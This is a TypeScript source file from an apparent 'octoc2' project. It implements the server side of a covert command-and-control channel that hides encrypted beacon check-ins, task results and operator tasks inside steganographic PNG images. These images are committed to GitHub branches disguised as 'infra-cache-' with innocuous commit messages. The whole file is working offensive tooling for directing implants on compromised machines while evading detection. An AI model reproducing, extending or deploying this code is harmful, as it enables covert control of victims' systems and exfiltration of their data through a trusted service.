import { createRequire } from "node:module";
import type { Octokit } from "@octokit/rest";
import {
  decodeStegoPng,
  encodeStegoPng,
} from "@octoc2/shared/stego";
import type _SodiumModule from "libsodium-wrappers";
import type { BeaconRegistry } from "../BeaconRegistry.ts";
import type { TaskQueue } from "../TaskQueue.ts";
import {
  base64ToBytes,
  encryptForBeacon,
  openSealBox,
} from "../crypto/sodium.ts";
import {
  DurablePollState,
  PollRunner,
  repositoryPollScope,
} from "../lib/PollRunner.ts";
import { collectGitHubPages } from "../lib/GitHubPagination.ts";
import { sha256Hex } from "../store/index.ts";
import {
  assertAcceptedResult,
  checkinAuthorizesTaskDelivery,
  parseCheckinPayload,
  parseTaskResult,
  type SecureChannelServices,
} from "./ChannelServices.ts";
import {
  claimDeliveries,
  finishDeliveries,
  processIncomingArtifact,
  rejectArtifact,
} from "./ChannelRuntime.ts";

const sodium = createRequire(import.meta.url)(
  "libsodium-wrappers",
) as typeof _SodiumModule;
const BRANCH_RE = /^refs\/heads\/infra-cache-([0-9a-f]{8})$/i;
const REF_UPDATE_ATTEMPTS = 3;

function isRefConflict(error: unknown): boolean {
  const status = (error as { status?: number } | null)?.status;
  return status === 409 || status === 422;
}

interface SteganographyChannelOpts {
  owner: string;
  repo: string;
  token: string;
  operatorSecretKey: Uint8Array;
  pollIntervalMs: number;
  octokit: Octokit;
}

export class SteganographyChannel {
  private readonly runner: PollRunner;
  private readonly ackProgress: DurablePollState;
  private readonly resultProgress: DurablePollState;
  private readonly stegoBeacons = new Map<string, string>();
  private defaultBranch: string | null = null;

  constructor(
    private readonly registry: BeaconRegistry,
    private readonly queue: TaskQueue,
    private readonly opts: SteganographyChannelOpts,
    private readonly services: SecureChannelServices,
  ) {
    const scope = repositoryPollScope(opts.owner, opts.repo);
    this.ackProgress = new DurablePollState(
      services.store,
      "stego-ack-poll",
      scope,
      0,
    );
    this.resultProgress = new DurablePollState(
      services.store,
      "stego-result-poll",
      scope,
      0,
    );
    this.runner = new PollRunner({
      name: "SteganographyChannel",
      intervalMs: opts.pollIntervalMs,
      poll: () => this.poll(),
      onError: (error) => {
        console.warn(
          "[SteganographyChannel] Poll error:",
          error instanceof Error ? error.message : String(error),
        );
      },
    });
  }

  start(): void {
    this.runner.start();
    console.log("[SteganographyChannel] Started polling");
  }

  async stop(): Promise<void> {
    await this.runner.stop();
    console.log("[SteganographyChannel] Stopped");
  }

  async poll(): Promise<void> {
    const deliveryEligible = new Map<string, string>();
    const refs = await collectGitHubPages(
      (page, per_page) =>
        this.opts.octokit.rest.git.listMatchingRefs({
          owner: this.opts.owner,
          repo: this.opts.repo,
          ref: "heads/infra-cache-",
          page,
          per_page,
        }),
      (response) => response.data,
    );
    for (const ref of refs) {
      const match = BRANCH_RE.exec(ref.ref);
      if (!match) continue;
      const id8 = match[1]!.toLowerCase();
      const beaconId = await this.processAck(ref.ref, id8);
      if (beaconId) deliveryEligible.set(beaconId, id8);
      await this.processResults(ref.ref, id8);
    }
    await this.deliverPendingTasks(deliveryEligible);
  }

  private async processAck(
    branchRef: string,
    id8: string,
  ): Promise<string | null> {
    const path = `infra-${id8}-a.png`;
    try {
      const file = await this.readFile(branchRef, path);
      if (!file) return null;
      const messageId = `ack:${branchRef}:${file.sha}`;
      const processed = await processIncomingArtifact(
        this.services,
        this.ackProgress,
        {
          messageId,
          payload: encodeBase64(file.bytes),
          cursor: file.sha,
        },
        "malformed Steganography ACK PNG",
        () => {
          const hidden = decodeStegoPng(file.bytes);
          if (!hidden) {
            rejectArtifact("ACK PNG contains no valid stego payload");
          }
          const checkin = parseCheckinPayload(
            new TextDecoder().decode(hidden),
          );
          if (checkin.beaconId.slice(0, 8).toLowerCase() !== id8) {
            rejectArtifact(
              "ACK branch does not match signed beaconId",
            );
          }
          return checkin;
        },
        async (checkin) => {
          const status =
            await this.services.identities.verifyAndRegisterCheckin(
            checkin,
            checkin.beaconId,
            9,
          );
          return {
            outcome: checkinAuthorizesTaskDelivery(status)
              ? "accepted"
              : "duplicate",
            beaconId: checkin.beaconId,
          };
        },
      );
      if (processed.status === "conflicting_duplicate") {
        rejectArtifact("conflicting ACK PNG");
      }
      if (processed.outcome === "rejected" || !processed.value) return null;
      this.stegoBeacons.set(processed.value.beaconId, id8);
      if (
        processed.status === "processed" &&
        processed.outcome === "accepted"
      ) return processed.value.beaconId;
      return null;
    } catch (error: any) {
      if (error?.status !== 404) {
        console.warn(
          `[SteganographyChannel] ACK processing error for ${id8}:`,
          (error as Error).message,
        );
      }
      return null;
    }
  }

  private async processResults(
    branchRef: string,
    id8: string,
  ): Promise<void> {
    const beaconId = [...this.stegoBeacons].find(
      ([, registeredId8]) => registeredId8 === id8,
    )?.[0];
    if (!beaconId) return;
    const tree = await this.listTree(branchRef);
    const prefix = `infra-${id8}-r-`;
    for (const item of tree) {
      if (
        typeof item.path !== "string" ||
        !item.path.startsWith(prefix) ||
        !item.path.endsWith(".png")
      ) {
        continue;
      }
      try {
        const file = await this.readFile(branchRef, item.path);
        if (!file) continue;
        await sodium.ready;
        const operatorPublicKey = sodium.crypto_scalarmult_base(
          this.opts.operatorSecretKey,
        );
        const taskId8 = item.path.slice(prefix.length, -".png".length);
        const messageId = `result:${branchRef}:${file.sha}`;
        const processed = await processIncomingArtifact(
          this.services,
          this.resultProgress,
          {
            messageId,
            payload: encodeBase64(file.bytes),
            cursor: file.sha,
          },
          "malformed Steganography result PNG",
          async () => {
            const hidden = decodeStegoPng(file.bytes);
            if (!hidden) {
              rejectArtifact(
                "result PNG contains no valid stego payload",
              );
            }
            const sealed = new TextDecoder().decode(hidden);
            if (!sealed) rejectArtifact("result PNG payload is empty");
            const plaintext = new TextDecoder().decode(await openSealBox(
              sealed,
              operatorPublicKey,
              this.opts.operatorSecretKey,
            ));
            const result = parseTaskResult(plaintext);
            if (result.beaconId !== beaconId) {
              rejectArtifact(
                "result beaconId does not match its branch",
              );
            }
            if (
              !/^[0-9a-f]{8}$/i.test(taskId8) ||
              !result.taskId.toLowerCase().startsWith(
                taskId8.toLowerCase(),
              )
            ) {
              rejectArtifact(
                "result PNG filename does not match signed taskId",
              );
            }
            return { result, sealed };
          },
          async ({ result, sealed }) => {
            const accepted = assertAcceptedResult(
              await this.services.tasks.acceptSignedResult(
                result,
                beaconId,
                {
                  channel: "stego",
                  messageId,
                  payloadDigest: sha256Hex(sealed),
                },
              ),
            );
            return {
              outcome: accepted,
              beaconId,
              taskId: result.taskId,
            };
          },
        );
        if (processed.status === "conflicting_duplicate") {
          rejectArtifact("conflicting result PNG");
        }
        if (processed.outcome === "rejected") continue;
        await this.deleteFile(branchRef, item.path);
      } catch (error) {
        console.warn(
          `[SteganographyChannel] Result processing error for ${item.path}:`,
          (error as Error).message,
        );
      }
    }
  }

  private async deliverPendingTasks(
    deliveryEligible: ReadonlyMap<string, string>,
  ): Promise<void> {
    for (const [beaconId, id8] of deliveryEligible) {
      const pending = this.queue.getDeliverableTasks(beaconId, "stego");
      if (pending.length === 0) continue;
      const deliveries = claimDeliveries(
        this.services,
        "stego",
        beaconId,
        pending,
        Math.max(this.opts.pollIntervalMs * 2, 60_000),
      );
      if (deliveries.length === 0) continue;
      const beacon = this.registry.get(beaconId);
      if (!beacon) {
        finishDeliveries(
          this.services,
          deliveries,
          "permanent_failure",
          "beacon registry entry is unavailable",
        );
        continue;
      }
      try {
        const encrypted = await encryptForBeacon(
          JSON.stringify(deliveries.map(({ task }) => ({
            taskId: task.taskId,
            kind: task.kind,
            args: task.args,
            ref: task.ref,
          }))),
          await base64ToBytes(beacon.publicKey),
          this.opts.operatorSecretKey,
        );
        const png = encodeStegoPng(
          new TextEncoder().encode(JSON.stringify(encrypted)),
        );
        await this.writeFile(
          id8,
          `infra-${id8}-t.png`,
          png,
          "update cache artifact",
        );
        finishDeliveries(this.services, deliveries, "delivered");
        this.registry.updateActiveTentacle(beaconId, 9);
      } catch (error) {
        finishDeliveries(
          this.services,
          deliveries,
          "transient_failure",
          error,
        );
        console.warn(
          `[SteganographyChannel] Task delivery error for ${beaconId}:`,
          (error as Error).message,
        );
      }
    }
  }

  private async readFile(
    branchRef: string,
    path: string,
  ): Promise<{ bytes: Uint8Array; sha: string } | null> {
    const response = await this.opts.octokit.rest.repos.getContent({
      owner: this.opts.owner,
      repo: this.opts.repo,
      path,
      ref: branchRef,
    });
    const data = response.data as any;
    if (data.type !== "file" || !data.content || !data.sha) return null;
    return {
      bytes: decodeBase64(data.content),
      sha: String(data.sha),
    };
  }

  private async listTree(branchRef: string): Promise<any[]> {
    const shortRef = branchRef.replace(/^refs\//, "");
    const ref = await this.opts.octokit.rest.git.getRef({
      owner: this.opts.owner,
      repo: this.opts.repo,
      ref: shortRef,
    });
    const commit = await this.opts.octokit.rest.git.getCommit({
      owner: this.opts.owner,
      repo: this.opts.repo,
      commit_sha: ref.data.object.sha,
    });
    const tree = await this.opts.octokit.rest.git.getTree({
      owner: this.opts.owner,
      repo: this.opts.repo,
      tree_sha: commit.data.tree.sha,
    });
    return tree.data.tree as any[];
  }

  private async writeFile(
    id8: string,
    path: string,
    bytes: Uint8Array,
    message: string,
  ): Promise<void> {
    const refShort = `heads/infra-cache-${id8}`;
    const refFull = `refs/${refShort}`;
    const blob = await this.opts.octokit.rest.git.createBlob({
      owner: this.opts.owner,
      repo: this.opts.repo,
      content: encodeBase64(bytes),
      encoding: "base64",
    });

    for (let attempt = 1; attempt <= REF_UPDATE_ATTEMPTS; attempt++) {
      let headSha: string | null = null;
      try {
        const ref = await this.opts.octokit.rest.git.getRef({
          owner: this.opts.owner,
          repo: this.opts.repo,
          ref: refShort,
        });
        headSha = ref.data.object.sha;
      } catch (error: any) {
        if (error?.status !== 404) throw error;
      }
      const baseSha =
        headSha ?? await this.getDefaultBranchHeadSha();
      const baseCommit = await this.opts.octokit.rest.git.getCommit({
        owner: this.opts.owner,
        repo: this.opts.repo,
        commit_sha: baseSha,
      });
      const tree = await this.opts.octokit.rest.git.createTree({
        owner: this.opts.owner,
        repo: this.opts.repo,
        base_tree: baseCommit.data.tree.sha,
        tree: [{
          path,
          mode: "100644",
          type: "blob",
          sha: blob.data.sha,
        }],
      });
      const commit = await this.opts.octokit.rest.git.createCommit({
        owner: this.opts.owner,
        repo: this.opts.repo,
        message,
        tree: tree.data.sha,
        parents: [baseSha],
      });

      try {
        if (headSha) {
          await this.opts.octokit.rest.git.updateRef({
            owner: this.opts.owner,
            repo: this.opts.repo,
            ref: refShort,
            sha: commit.data.sha,
            force: false,
          });
        } else {
          await this.opts.octokit.rest.git.createRef({
            owner: this.opts.owner,
            repo: this.opts.repo,
            ref: refFull,
            sha: commit.data.sha,
          });
        }
        return;
      } catch (error) {
        if (
          attempt === REF_UPDATE_ATTEMPTS ||
          !isRefConflict(error)
        ) {
          throw error;
        }
      }
    }
  }

  private async deleteFile(branchRef: string, path: string): Promise<void> {
    const refShort = branchRef.replace(/^refs\//, "");
    for (let attempt = 1; attempt <= REF_UPDATE_ATTEMPTS; attempt++) {
      const ref = await this.opts.octokit.rest.git.getRef({
        owner: this.opts.owner,
        repo: this.opts.repo,
        ref: refShort,
      });
      const commit = await this.opts.octokit.rest.git.getCommit({
        owner: this.opts.owner,
        repo: this.opts.repo,
        commit_sha: ref.data.object.sha,
      });
      const tree = await this.opts.octokit.rest.git.createTree({
        owner: this.opts.owner,
        repo: this.opts.repo,
        base_tree: commit.data.tree.sha,
        tree: [{
          path,
          mode: "100644",
          type: "blob",
          sha: null,
        }] as any,
      });
      const next = await this.opts.octokit.rest.git.createCommit({
        owner: this.opts.owner,
        repo: this.opts.repo,
        message: "consume cache artifact",
        tree: tree.data.sha,
        parents: [ref.data.object.sha],
      });

      try {
        await this.opts.octokit.rest.git.updateRef({
          owner: this.opts.owner,
          repo: this.opts.repo,
          ref: refShort,
          sha: next.data.sha,
          force: false,
        });
        return;
      } catch (error) {
        if (
          attempt === REF_UPDATE_ATTEMPTS ||
          !isRefConflict(error)
        ) {
          throw error;
        }
      }
    }
  }

  private async getDefaultBranchHeadSha(): Promise<string> {
    if (!this.defaultBranch) {
      const repository = await this.opts.octokit.rest.repos.get({
        owner: this.opts.owner,
        repo: this.opts.repo,
      });
      const branch = repository.data.default_branch?.trim();
      if (!branch) throw new Error("repository has no default branch");
      this.defaultBranch = branch;
    }
    const ref = await this.opts.octokit.rest.git.getRef({
      owner: this.opts.owner,
      repo: this.opts.repo,
      ref: `heads/${this.defaultBranch}`,
    });
    return ref.data.object.sha;
  }
}

function decodeBase64(value: string): Uint8Array {
  return Uint8Array.from(
    Buffer.from(value.replace(/\n/g, ""), "base64"),
  );
}

function encodeBase64(value: Uint8Array): string {
  return Buffer.from(value).toString("base64");
}
